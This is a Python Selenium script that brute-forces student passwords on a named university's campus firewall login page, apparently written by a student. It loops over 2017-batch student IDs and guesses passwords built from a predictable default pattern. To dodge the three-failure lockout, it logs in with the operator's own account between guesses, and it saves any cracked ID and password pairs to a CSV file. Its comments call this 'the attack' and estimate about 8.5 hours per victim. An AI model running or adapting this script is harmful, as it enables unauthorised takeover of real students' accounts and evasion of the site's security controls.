from time import sleep, strftime
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
fl = open('csvfile.csv','a')

#change this on your system depending on installation path
chromedriver_path = '/Users/abhinav/Downloads/chromedriver'
#set the below credentials to your own ID and Password
#will be required after 3 unsuccessful attempts otherwise, BITS login page blocks the attack for 5 minutes
B_ID="f2017XXXX" #replace XXXX
B_PWD="A7PSXXXXABCD#"

driver = webdriver.Chrome(executable_path=chromedriver_path) 
sleep(2)
login = 'https://fw.bits-pilani.ac.in:8090'
driver.get(login)
s2=2017
l=['A8','A2','A7','A4','A5','A1','A3','AB']

#PS Running this for all IDs and all possible branch codes will take an enormous time
#it takes roughly 8.5 hours to get one person's password assuming brach known
#if branch unkown and need to iterate from list l, time will increase by around 10x
for i in range(0,1200): #range of BITS IDs
    k=str(i)
    while len(k)<4:
        k='0'+k
    r=k
    k='f'+str(s2)+k
    #print(k)
    #BITS login id
    try:
        username = driver.find_element_by_xpath("//input[@name='username']")
        username.clear()
        username.send_keys(k)
    except:
        sleep(5)
        username = driver.find_element_by_xpath("//input[@name='username']")
        username.clear()
        username.send_keys(k)
    flag=0
    for b in l:
        pw=b
        pw+='PS'
        pw+=r
        for t in range(0,9999):
            g=str(t)
            passwd = driver.find_element_by_xpath("//input[@name='password']")
            login = driver.find_element_by_xpath("//div[@id='loginbutton']")
            if t%3==0:
                try:
                    username.clear()
                    passwd.clear()
                except:
                    sleep(5)
                    try:
                        username.clear()
                        passwd.clear()
                    except:
                        sleep(10)
                        try:
                            username.clear()
                            passwd.clear()
                        except:
                            sleep(20)
                            username.clear()
                            passwd.clear()
                try:
                    username.send_keys(B_ID)
                except:
                    sleep(2)
                    username.send_keys(B_ID)
                try:
                    passwd.send_keys(B_PWD)
                except:
                    sleep(2)
                    passwd.send_keys(B_PWD)
                try:
                    login.click()
                except:
                    sleep(5)
                    try:
                        login.click()
                    except:
                        sleep(10)
                        try:
                            login.click()
                        except:
                            sleep(60)
                            login.click()
                sleep(2)
                try:
                    login.click()
                except:
                    sleep(2)
                    login.click()
                sleep(2)
                try:
                    username.clear()
                    username.send_keys(k)
                except:
                    try:
                        sleep(5)
                        username.clear()
                        username.send_keys(k)
                    except:
                        try:
                            login.click()
                            sleep(10)
                            username.clear()
                            username.send_keys(k)
                        except:
                            sleep(10)
                            login.click()
                            sleep(10)
                            username.clear()
                            username.send_keys(k)



            while len(g)<4:
                g='0'+g
            d=pw+g+'#'
            print(d)
            try:
                passwd.clear()
                passwd.send_keys(d)
            except:
                sleep(2)
                try:
                    passwd.clear()
                    passwd.send_keys(d)
                except:
                    sleep(5)
                    try:
                        passwd.clear()
                        passwd.send_keys(d)
                    except:
                        sleep(10)
                        passwd.clear()
                        passwd.send_keys(d)

                #sleep(2)
            try:
                login.click()
            except:
                sleep(2)
                login.click()
            sleep(5)
            try:
                passwd.clear()
                passwd2 = driver.find_element_by_xpath("//div[@id='credentials' and @class='loggedin']")
                fl.write(k+','+d+"\n")
                flag=1
                break
            except Exception as e:
                continue
        if flag==1:
            break
        
fl.close


